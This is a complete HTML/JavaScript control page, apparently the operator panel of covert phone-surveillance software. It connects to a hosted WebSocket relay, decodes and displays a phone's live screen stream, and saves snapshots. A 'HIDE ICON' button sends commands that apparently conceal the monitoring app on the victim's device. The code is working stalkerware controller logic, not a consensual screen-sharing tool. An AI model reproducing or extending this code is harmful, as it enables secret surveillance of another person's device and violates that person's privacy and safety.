<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SystemSync Pro Control</title>
    <style>
        body { background: #0a0a0a; color: #eee; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
        .container { margin: 10px auto; width: 320px; height: 568px; border: 4px solid #222; background: #000; border-radius: 15px; overflow: hidden; }
        canvas { width: 100%; height: 100%; }
        .panel { background: #1a1a1a; padding: 20px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        button { padding: 10px 15px; margin: 5px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; transition: 0.2s; }
        #start { background: #28a745; color: #fff; }
        #stop { background: #dc3545; color: #fff; }
        #stealth { background: #6f42c1; color: #fff; } /* Purple for Stealth */
        .status-dot { height: 10px; width: 10px; background-color: #f00; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .online { background-color: #28a745; }
    </style>
</head>
<body>

    <h2>SystemSync Control Center</h2>
    <p><span id="dot" class="status-dot"></span> <span id="status">Offline</span></p>

    <div class="container">
        <canvas id="canvas" width="360" height="640"></canvas>
    </div>

    <div class="panel">
        <button id="start">START STREAM</button>
        <button id="stop" disabled>STOP</button>
        <button id="stealth">HIDE ICON</button>
        <br><br>
        <label><input type="checkbox" id="audioSync"> Enable Audio</label>
        <button id="snap" style="margin-left:15px; background:#444; color:#fff;">SNAP</button>
    </div>

    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const startBtn = document.getElementById('start'), stopBtn = document.getElementById('stop');
        const stealthBtn = document.getElementById('stealth'), statusText = document.getElementById('status');
        const dot = document.getElementById('dot');

        let ws, vDec, isHidden = false;

        startBtn.onclick = async () => {
            vDec = new VideoDecoder({
                output: f => { ctx.drawImage(f,0,0); f.close(); },
                error: e => console.error(e)
            });
            await vDec.configure({ codec: 'avc1.42E01E', codedWidth: 360, codedHeight: 640 });

            ws = new WebSocket("wss://mirror-view.onrender.com");
            ws.binaryType = 'arraybuffer';
            
            ws.onopen = () => {
                statusText.innerText = "Online";
                dot.classList.add('online');
                startBtn.disabled = true; stopBtn.disabled = false;
            };

            ws.onmessage = e => {
                if (typeof e.data === "string") return; // Ignore text commands
                const data = new Uint8Array(e.data);
                if (data[0] === 0) { // Video Type
                    const payload = data.slice(1);
                    const isKey = payload.length > 4000;
                    vDec.decode(new EncodedVideoChunk({
                        type: isKey ? 'key' : 'delta',
                        timestamp: performance.now(),
                        data: payload
                    }));
                }
            };

            ws.onclose = () => {
                statusText.innerText = "Offline";
                dot.classList.remove('online');
                startBtn.disabled = false; stopBtn.disabled = true;
            };
        };

        stealthBtn.onclick = () => {
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                alert("Connect to stream first!");
                return;
            }
            if (!isHidden) {
                ws.send("HIDE_ICON");
                stealthBtn.innerText = "UNHIDE ICON";
                stealthBtn.style.background = "#ffc107";
                isHidden = true;
            } else {
                ws.send("SHOW_ICON");
                stealthBtn.innerText = "HIDE ICON";
                stealthBtn.style.background = "#6f42c1";
                isHidden = false;
            }
        };

        stopBtn.onclick = () => { ws.close(); };
        document.getElementById('snap').onclick = () => {
            const link = document.createElement('a');
            link.download = 'capture.png';
            link.href = canvas.toDataURL();
            link.click();
        };
    </script>
</body>
</html>
